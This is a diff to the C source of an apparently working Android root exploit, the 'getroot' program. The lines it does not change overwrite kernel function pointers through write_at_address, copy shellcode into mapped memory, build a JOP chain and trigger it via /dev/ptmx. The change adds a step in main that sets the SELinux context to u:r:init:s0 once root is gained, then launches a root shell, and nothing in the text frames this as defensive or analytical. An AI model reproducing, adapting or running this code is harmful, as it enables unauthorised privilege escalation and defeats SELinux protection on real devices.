@@ -3,16 +3,16 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#include <unistd.h>
 #include <netinet/ip.h>
-
+#include <fcntl.h>
 #include <sys/mman.h>
 #include <sys/uio.h>
 
 #include <sys/resource.h>
 
 #include "getroot.h"
-#include "sidtab.h"
-#include "policydb.h"
+#include "selinux.h"
 #include "offsets.h"
 
 #define UDP_SERVER_PORT (5105)
@@ -303,8 +303,6 @@ int getroot(struct offsets* o)
 	if(write_at_address(o->fsync, (long)MMAP_START))
 		return 1;
 
-	sidtab = o->sidtab;
-	policydb = o->policydb;
 	copyshellcode(MMAP_START);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
@@ -339,8 +337,6 @@ int getroot(struct offsets* o)
 	if(write_at_address(o->check_flags, (long)o->joploc))
 		return 1;
 
-	sidtab = o->sidtab;
-	policydb = o->policydb;
 	preparejop(MMAP_START, o->jopret);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
@@ -407,6 +403,10 @@ int main(int argc, char* argv[])
 	
 	if(getuid() == 0)
 	{
+		ret = setprocattrcon("u:r:init:s0", 0, "current");
+		if(ret != 0) {
+			printf("change selinux context from u:r:kernel:s0 to u:r:init:s0 error!\n");
+		}
 		printf("got root lmao\n");
 		if(argc <= 1)
 			system("USER=root /system/bin/sh");
